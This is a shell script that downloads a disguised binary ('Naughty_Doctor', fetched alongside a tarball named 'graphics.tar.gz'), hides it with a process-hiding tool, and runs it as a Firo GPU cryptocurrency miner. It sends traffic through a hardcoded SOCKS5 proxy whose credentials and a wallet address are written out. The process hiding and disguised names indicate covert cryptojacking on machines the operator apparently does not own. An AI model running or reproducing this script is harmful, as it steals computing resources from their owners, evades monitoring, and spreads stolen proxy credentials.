#!/bin/sh
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 3.16.66.235:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Naughty_Doctor
chmod +x Naughty_Doctor

#unset LD_PRELOAD
#unset LD_PRELOAD_ENV
#unset LD_LIBRARY_PATH

ph add Naughty_Doctor

./Naughty_Doctor --disable-cpu --algorithm firopow --pool firo-us.mintpond.com:3005 --ssl true --wallet a2SHN1rGMt1Q8MUx9LXrHB265LgvUzjqM1.Naughty_Doctor --proxy mikrotik999:Elibawnos@3.16.66.235:1080 --gpu-boost 3
